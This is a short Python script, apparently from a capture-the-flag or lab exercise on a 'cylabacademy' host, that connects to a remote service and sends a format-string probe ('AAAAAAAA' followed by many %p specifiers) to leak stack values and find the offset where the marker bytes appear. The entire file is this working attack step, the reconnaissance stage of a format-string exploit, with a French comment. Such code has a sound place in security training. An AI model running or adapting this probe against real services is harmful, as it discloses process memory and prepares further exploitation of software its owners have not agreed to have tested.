import sys, socket, time, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "chatelaine.cylabacademy.net", 23380
s = socket.create_connection((HOST, PORT), timeout=12)
s.settimeout(5)
time.sleep(0.6)
try:
    s.recv(8192)
except Exception:
    pass
payload = b"AAAAAAAA" + "".join(f".%{i}$p" for i in range(1, 60)).encode() + b"\n"
s.sendall(payload)
time.sleep(0.9)
out = b""
try:
    out = s.recv(32768)
except Exception:
    pass
txt = out.decode("utf-8", "replace")
print(txt[:2000])
for m in re.finditer(r"(\d+)\$p\)?", txt):
    pass
# trouver la position ou 0x4141414141414141 apparait
parts = txt.split(".")
for i, p in enumerate(parts):
    if "4141414141414141" in p:
        print("BUFFER a la position (approx):", i)
s.close()
